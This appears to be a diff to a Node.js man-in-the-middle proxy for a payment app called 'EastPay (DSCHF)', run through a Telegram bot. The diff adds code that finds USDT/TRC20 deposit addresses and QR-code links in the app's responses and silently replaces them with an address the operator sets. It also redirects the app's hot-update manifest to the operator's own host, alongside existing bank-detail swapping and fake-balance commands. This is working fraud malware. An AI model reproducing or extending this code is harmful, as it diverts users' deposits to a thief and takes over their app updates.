@@ -18,6 +18,7 @@ const DEFAULT_DATA = {
   lastUsedIndex: -1,
   adminChatId: null,
   logRequests: false,
+  usdtAddress: '',
   userOverrides: {},
   trackedUsers: {}
 };
@@ -332,6 +333,21 @@ async function transparentProxy(req, res) {
       const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.id || rd.memberId || '') : '';
       if (uid) saveTokenUserId(req, uid);
     }
+    const data = cachedData || await loadData();
+    if (data.usdtAddress && jsonResp) {
+      const result = replaceUsdtInResponse(jsonResp, data);
+      if (result && result.oldAddr) {
+        const newBody = JSON.stringify(jsonResp);
+        respHeaders['content-type'] = 'application/json; charset=utf-8';
+        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
+        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+        delete respHeaders['etag'];
+        delete respHeaders['last-modified'];
+        res.writeHead(response.status, respHeaders);
+        res.end(newBody);
+        return;
+      }
+    }
     res.writeHead(response.status, respHeaders);
     res.end(respBody);
   } catch(e) {
@@ -427,6 +443,73 @@ function deepReplace(obj, bank, originalValues, depth) {
   }
 }
 
+function replaceUsdtInResponse(jsonResp, data) {
+  if (!data.usdtAddress || !jsonResp) return null;
+  const newAddr = data.usdtAddress;
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
+  function scanAndReplace(obj, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 10) return '';
+    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
+    let oldAddr = '';
+    for (const key of Object.keys(obj)) {
+      const kl = key.toLowerCase();
+      if (typeof obj[key] === 'string') {
+        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
+          if (obj[key].length >= 20 && obj[key] !== newAddr) {
+            oldAddr = oldAddr || obj[key];
+            obj[key] = newAddr;
+          }
+        }
+        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
+          obj[key] = qrUrl;
+        }
+        if (kl.includes('qr') || kl.includes('code')) {
+          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
+            obj[key] = qrUrl;
+          }
+        }
+      } else if (typeof obj[key] === 'object') {
+        const found = scanAndReplace(obj[key], depth + 1);
+        if (found) oldAddr = oldAddr || found;
+      }
+    }
+    if (oldAddr) {
+      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      const re = new RegExp(escaped, 'g');
+      for (const key of Object.keys(obj)) {
+        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
+          obj[key] = obj[key].replace(re, newAddr);
+        }
+      }
+    }
+    return oldAddr;
+  }
+  let foundOld = '';
+  const rd = getResponseData(jsonResp);
+  if (rd) foundOld = scanAndReplace(rd, 0) || '';
+  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
+  const fullStr = JSON.stringify(jsonResp);
+  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
+  if (trcMatch) {
+    for (const addr of trcMatch) {
+      if (addr !== newAddr) {
+        foundOld = foundOld || addr;
+        const escaped = addr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const re = new RegExp(escaped, 'g');
+        function replaceInObj(o, depth) {
+          if (!o || typeof o !== 'object' || depth > 10) return;
+          for (const k of Object.keys(o)) {
+            if (typeof o[k] === 'string') o[k] = o[k].replace(re, newAddr);
+            else if (typeof o[k] === 'object') replaceInObj(o[k], depth + 1);
+          }
+        }
+        replaceInObj(jsonResp, 0);
+      }
+    }
+  }
+  return { oldAddr: foundOld, newAddr };
+}
+
 async function proxyAndReplaceBankDetails(req, res, label) {
   const data = await loadData();
   const reqUserId = await extractUserId(req, null);
@@ -448,6 +531,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
         }
       }
     }
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
     sendJson(res, respHeaders, jsonResp, respBody);
     if (!isLogOff(data, effectiveId) && data.adminChatId && bot) {
       const phone = getPhone(data, effectiveId);
@@ -486,7 +570,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/debug - Debug next response');
+      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/debug - Debug next response');
       return res.sendStatus(200);
     }
 
@@ -494,6 +578,7 @@ app.post('/bot-webhook', async (req, res) => {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
       let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      if (data.usdtAddress) m += `\n💎 USDT: ${data.usdtAddress}`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
@@ -505,6 +590,31 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace response dump'); return res.sendStatus(200); }
+
+    if (text.startsWith('/setusdt ')) {
+      const addr = text.substring(9).trim();
+      if (!addr || addr.length < 20) { await bot.sendMessage(chatId, '❌ Invalid USDT address. Format: /setusdt <TRC20_address>'); return res.sendStatus(200); }
+      data.usdtAddress = addr;
+      await saveData(data);
+      await bot.sendMessage(chatId, `💎 USDT Address set:\n${addr}\n\nApp mein ab yahi address show hoga.`);
+      return res.sendStatus(200);
+    }
+
+    if (text === '/usdt') {
+      if (data.usdtAddress) {
+        await bot.sendMessage(chatId, `💎 Current USDT Address:\n${data.usdtAddress}`);
+      } else {
+        await bot.sendMessage(chatId, '⚠️ Koi USDT address set nahi hai.\nSet karne ke liye: /setusdt <address>');
+      }
+      return res.sendStatus(200);
+    }
+
+    if (text === '/removeusdt') {
+      data.usdtAddress = '';
+      await saveData(data);
+      await bot.sendMessage(chatId, '✅ USDT address removed. Original address ab show hoga.');
+      return res.sendStatus(200);
+    }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
@@ -1297,6 +1407,11 @@ app.get('/chcp/*', async (req, res) => {
       let body = await resp.text();
       body = body.replace(/https:\/\/api\.eastpay-wallet\.com\/app/g, 'https://dschf.vercel.app/app');
       body = body.replace(/api\.eastpay-wallet\.com\/app/g, 'dschf.vercel.app/app');
+      res.set('Content-Type', contentType);
+      res.send(body);
+    } else if (filePath === 'chcp.json') {
+      let body = await resp.text();
+      body = body.replace(/https:\/\/fire-pay\.oss-ap-southeast-1\.aliyuncs\.com\/app\/release\/chcp\//g, 'https://dschf.vercel.app/chcp/');
       res.set('Content-Type', contentType);
       res.send(body);
     } else {
